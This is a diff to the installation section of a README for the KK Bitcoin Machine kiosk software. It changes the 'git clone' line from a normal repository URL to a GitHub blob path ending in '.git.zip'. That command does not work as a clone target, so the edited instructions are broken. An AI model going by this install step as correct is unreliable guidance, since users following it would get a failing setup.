@@ -4,7 +4,7 @@ The software that runs the KK Bitcoin Machine.
 ## Installing
 
 ```
-git clone https://github.com/KryptoKiosk/KryptoKiosk-machine.git
+git clone https://github.com/KryptoKiosk/OS/blob/master/KryptoKiosk-machine.git.zip
 cd KryptoKiosk-machine
 npm install
 ./setup.sh
